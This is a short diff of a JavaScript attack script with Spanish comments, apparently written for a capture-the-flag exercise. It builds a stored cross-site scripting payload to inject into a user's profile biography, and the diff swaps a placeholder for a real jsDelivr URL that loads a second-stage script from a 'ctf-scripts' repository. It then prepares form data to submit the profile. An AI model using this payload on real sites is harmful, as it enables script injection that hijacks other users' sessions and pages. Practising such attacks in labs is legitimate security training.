@@ -2,7 +2,7 @@
 
 // 1. Definimos el payload que se inyectará en la biografía de Pepe.
 //    Este payload cargará nuestro script de la segunda etapa.
-const bioPayload = '<script src="URL_DE_TU_STAGE2_JS_EN_JSDELIVR"></script>';
+const bioPayload = '<script src="https://cdn.jsdelivr.net/gh/FranDSchz/ctf-scripts/stage2.js"></script>';
 
 // 2. Creamos un objeto FormData para simular el envío del formulario del perfil.
 //    La petición de perfil es 'multipart/form-data'.
